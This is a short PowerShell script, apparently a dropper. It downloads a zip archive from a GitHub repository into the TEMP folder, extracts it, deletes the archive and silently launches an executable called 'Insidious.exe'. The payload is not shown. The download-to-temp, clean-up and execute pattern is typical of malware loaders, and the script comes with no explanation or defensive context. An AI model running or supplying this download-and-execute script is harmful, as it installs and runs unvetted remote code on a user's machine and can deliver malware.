$url = "https://github.com/whoamidwh/twertwert/archive/refs/heads/main.zip"
$zipPath = "$env:TEMP\twertwert-main.zip"
$extractPath = "$env:TEMP\twertwert-main"
$exePath = "$extractPath\twertwert-main\Insidious.exe"


Invoke-WebRequest -Uri $url -OutFile $zipPath


New-Item -ItemType Directory -Path $extractPath -Force


Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force


Remove-Item -Path $zipPath -Force


Start-Process -FilePath $exePath
